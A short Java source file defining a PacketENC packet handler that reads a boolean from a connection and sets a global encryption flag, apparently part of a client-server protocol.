package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class PacketENC extends Packet {

	@Override
	public void read(String line) throws Exception {
		Main.encryption = Connection.readBoolean();
	}

}
